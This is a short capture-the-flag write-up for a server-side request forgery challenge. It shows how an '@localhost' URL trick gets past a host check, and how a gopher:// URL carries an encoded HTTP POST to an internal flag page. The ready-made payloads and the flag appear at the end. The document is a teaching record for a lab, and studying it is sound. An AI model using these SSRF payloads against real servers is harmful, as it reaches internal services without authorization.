* Category
  * SSRF
* Solution
  1. How to forge as server
     * ```@localhost``` or ```@127.0.0.1``` after host name
     * The response doesn't show the flag but tell you that you need to set attribute
       ```html
       <form action="/flag.php" method="post">
            Do you want the FLAG? <input type="text" name="givemeflag" value="no">
            <input type="submit">
        </form>
       ``` 
  2. How to set value of ```givemeflag``` to ```yes```
     *  Use ```gopher``` protocol to send any TCP packet
     *  ```gopher://```
        *  protocol
     *  ```127.0.0.1:80```
        *  localhost
        *  http
     *  ```_```
        *  padding
     *  ```POST%20/flag.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2014%0d%0a%0d%0agivemeflag=yes```
        ```http
        POST /flag.php HTTP/1.1\r\n
        Host: 127.0.0.1\r\n
        Content-Type: application/x-www-form-urlencoded\r\n
        Content-Length: 14\r\n
        \r\n
        givemeflag=yes
        ```
* Payload
  1. ```http://h4ck3r.quest:8500@localhost/flag.php```
  2. ```gopher://127.0.0.1:80/_POST%20/flag.php%20HTTP/1.1%0d%0aHost:%20127.0.0.1%0d%0aContent-Type:%20application/x-www-form-urlencoded%0d%0aContent-Length:%2014%0d%0a%0d%0agivemeflag=yes```
* ```FLAG{gopher://http_post}```